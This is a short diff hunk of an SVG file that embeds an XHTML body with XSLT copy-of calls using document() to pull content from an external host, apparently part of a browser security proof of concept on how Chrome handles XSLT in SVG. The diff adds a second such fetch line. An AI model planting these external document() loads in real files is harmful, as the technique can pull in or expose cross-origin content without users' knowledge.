@@ -8,6 +8,7 @@
     <foreignObject class="node" font-size="18" width="100%" height="100%">
     <body xmlns="http://www.w3.org/1999/xhtml">
       <xmp><xsl:copy-of  select="document('https://sumsec.me/resources/chrome/r.php')"/></xmp>
+      <xmp><xsl:copy-of  select="document('https://sumsec.me/resources/chrome/r.xxx')"/></xmp>
     </body>
     </foreignObject>
   </svg>
